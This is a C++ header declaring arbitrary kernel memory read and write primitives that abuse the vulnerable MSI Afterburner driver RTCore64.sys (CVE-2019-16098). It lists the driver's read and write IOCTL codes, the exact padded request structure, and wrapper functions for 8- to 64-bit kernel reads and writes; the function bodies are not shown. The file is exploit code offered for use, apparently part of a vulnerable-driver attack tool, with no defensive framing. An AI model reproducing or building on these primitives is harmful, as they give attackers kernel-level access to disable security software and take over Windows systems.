#pragma once
#include <Windows.h>

// ─── RTCore64.sys kernel memory R/W primitives ───────────────────────────────
// Driver: MSI Afterburner RTCore64.sys (CVE-2019-16098)
// IOCTL 0x80002048 = read,  0x8000204c = write
// Max transfer: 4 bytes per call; 8-byte reads done as two 4-byte reads.

struct RTCORE64_MEMORY_OP {
    BYTE    Pad0[8];
    DWORD64 Address;
    BYTE    Pad1[8];
    DWORD   Size;       // 1, 2, or 4
    DWORD   Value;
    BYTE    Pad2[16];
};
static_assert(sizeof(RTCORE64_MEMORY_OP) == 48, "RTCORE64_MEMORY_OP size mismatch");

namespace RTCore {

extern HANDLE hDev;

bool    Open();
void    Close();

BYTE    Rd8 (DWORD64 addr);
WORD    Rd16(DWORD64 addr);
DWORD   Rd32(DWORD64 addr);
DWORD64 Rd64(DWORD64 addr);

void    Wr8 (DWORD64 addr, BYTE    val);
void    Wr32(DWORD64 addr, DWORD   val);
void    Wr64(DWORD64 addr, DWORD64 val);

// Safe read: returns false if addr looks invalid (not canonical kernel VA)
bool    SafeRd64(DWORD64 addr, DWORD64& out);

} // namespace RTCore
